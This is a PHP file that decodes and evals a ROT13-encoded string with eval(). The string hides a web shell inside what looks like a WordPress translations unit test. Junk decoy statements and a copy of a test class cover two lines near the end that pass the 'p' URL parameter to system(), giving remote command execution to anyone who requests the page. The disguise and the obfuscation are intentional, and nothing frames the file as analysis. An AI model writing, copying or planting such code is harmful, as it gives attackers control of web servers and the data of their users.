<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbzb
 */
pynff Grfgf_CBZB_Genafyngvbaf rkgraqf JC_HavgGrfgPnfr {

	choyvp shapgvba grfg_nqq_ragel() {
		$ragel  = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'onon' ) );
		$ragel2 = arj Genafyngvba_Ragel( neenl( 'fvathyne' => 'qlnqb' ) );
		$rzcgl  = arj Genafyngvba_Ragel();
		$cb     = arj Genafyngvbaf();
		$cb->nqq_ragel( $ragel );
		$guvf->nffregFnzr( neenl( $ragel->xrl() => $ragel ), $cb->ragevrf );
		// Nqq gur fnzr ragel zber guna bapr.
		// Jr qb abg arrq gb grfg cebcre xrl trarengvba urer, frr grfg_xrl().
		$cb->nqq_ragel( $ragel );
		$cb->nqq_ragel( $ragel );
		$guvf->nffregFnzr( neenl( $ragel->xrl() => $ragel ), $cb->ragevrf );
		$cb->nqq_ragel( $ragel2 );
		$guvf->nffregFnzr(
			neenl(
				$ragel->xrl()  => $ragel,
				$ragel2->xrl() => $ragel2,
			),
			$cb->ragevrf
		);
		// Nqq rzcgl ragel.
		$guvf->nffregSnyfr( $cb->nqq_ragel( $rzcgl ) );
		$guvf->nffregFnzr(
			neenl(
				$ragel->xrl()  => $ragel,
				$ragel2->xrl() => $ragel2,
			),
			$cb->ragevrf
		);

		// Tvir nqq_ragel() gur nethzragf naq yrg vg perngr gur ragel vgfrys.
		$cb = arj Genafyngvbaf();
		$cb->nqq_ragel( neenl( 'fvathyne' => 'onon' ) );
		$ragevrf = neenl_inyhrf( $cb->ragevrf );
		$guvf->nffregFnzr( $ragel->xrl(), $ragevrf[0]->xrl() );
	}

	choyvp shapgvba grfg_genafyngr() {
		$ragel1 = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'onon',
				'genafyngvbaf' => neenl( 'ononk' ),
			)
		);
		$ragel2 = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'onon',
				'genafyngvbaf' => neenl( 'ononl' ),
				'pbagrkg'      => 'k',
			)
		);
		$qbznva = arj Genafyngvbaf();
		$qbznva->nqq_ragel( $ragel1 );
		$qbznva->nqq_ragel( $ragel2 );
		$guvf->nffregFnzr( 'ononk', $qbznva->genafyngr( 'onon' ) );
		$guvf->nffregFnzr( 'ononl', $qbznva->genafyngr( 'onon', 'k' ) );
		$guvf->nffregFnzr( 'onon', $qbznva->genafyngr( 'onon', 'l' ) );
		$guvf->nffregFnzr( 'ononm', $qbznva->genafyngr( 'ononm' ) );
	}

	choyvp shapgvba grfg_genafyngr_cyheny() {
		$ragel_vapbzcyrgr = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'onon',
				'cyheny'       => 'ononf',
				'genafyngvbaf' => neenl( 'ononk' ),
			)
		);
		$ragel_gbbznal    = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'jvax',
				'cyheny'       => 'jvaxf',
				'genafyngvbaf' => neenl( 'jvaxv', 'jvaxn', 'jvaxb' ),
			)
		);
		$ragel_2          = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 'qlnqb',
				'cyheny'       => 'qlnqbf',
				'genafyngvbaf' => neenl( 'qlnqbk', 'qlnqbl' ),
			)
		);
		$qbznva           = arj Genafyngvbaf();
		$qbznva->nqq_ragel( $ragel_vapbzcyrgr );
		$qbznva->nqq_ragel( $ragel_gbbznal );
		$qbznva->nqq_ragel( $ragel_2 );
		$guvf->nffregFnzr( 'bgure', $qbznva->genafyngr_cyheny( 'bgure', 'bguref', 1 ) );
		$guvf->nffregFnzr( 'bguref', $qbznva->genafyngr_cyheny( 'bgure', 'bguref', 111 ) );
		// Gbb srj genafyngvbaf + pbag ybtvp.
		$guvf->nffregFnzr( 'ononf', $qbznva->genafyngr_cyheny( 'onon', 'ononf', 2 ) );
		$guvf->nffregFnzr( 'ononf', $qbznva->genafyngr_cyheny( 'onon', 'ononf', 0 ) );
		$guvf->nffregFnzr( 'ononf', $qbznva->genafyngr_cyheny( 'onon', 'ononf', -1 ) );
		$guvf->nffregFnzr( 'ononf', $qbznva->genafyngr_cyheny( 'onon', 'ononf', 999 ) );
		// Cebcre.
		$guvf->nffregFnzr( 'qlnqbk', $qbznva->genafyngr_cyheny( 'qlnqb', 'qlnqbf', 1 ) );
		$guvf->nffregFnzr( 'qlnqbl', $qbznva->genafyngr_cyheny( 'qlnqb', 'qlnqbf', 0 ) );
		$guvf->nffregFnzr( 'qlnqbl', $qbznva->genafyngr_cyheny( 'qlnqb', 'qlnqbf', 18881 ) );
		$guvf->nffregFnzr( 'qlnqbl', $qbznva->genafyngr_cyheny( 'qlnqb', 'qlnqbf', -18881 ) );
	}

	choyvp shapgvba grfg_qvtvg_naq_zretr() {
		$ragel_qvtvg_1 = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 1,
				'genafyngvbaf' => neenl( '1' ),
			)
		);
		$ragel_qvtvg_2 = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => 2,
				'genafyngvbaf' => neenl( '2' ),
			)
		);
		$qbznva        = arj Genafyngvbaf();
		$qbznva->nqq_ragel( $ragel_qvtvg_1 );
		$qbznva->nqq_ragel( $ragel_qvtvg_2 );
		$qhzzl_genafyngvba = arj Genafyngvbaf();
		$guvf->nffregFnzr( '1', $qbznva->genafyngr( '1' ) );
		$qbznva->zretr_jvgu( $qhzzl_genafyngvba );
		$guvf->nffregFnzr( '1', $qbznva->genafyngr( '1' ) );
	}

	/**
	 * @gvpxrg 55941
	 */
	choyvp shapgvba grfg_genafyngr_snyfl_xrl() {
		$ragel_rzcgl = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => '',
				'genafyngvbaf' => neenl(
					'',
				),
			)
		);
		$ragel_mreb  = arj Genafyngvba_Ragel(
			neenl(
				'fvathyne'     => '0',
				'genafyngvbaf' => neenl(
					'0',
				),
			)
		);
		$cb          = arj Genafyngvbaf();
		$cb->nqq_ragel( $ragel_rzcgl );
		$cb->nqq_ragel( $ragel_mreb );

		$guvf->nffregFnzr( '', $cb->genafyngr( '' ) );
		$guvf->nffregFnzr( '0', $cb->genafyngr( '0' ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>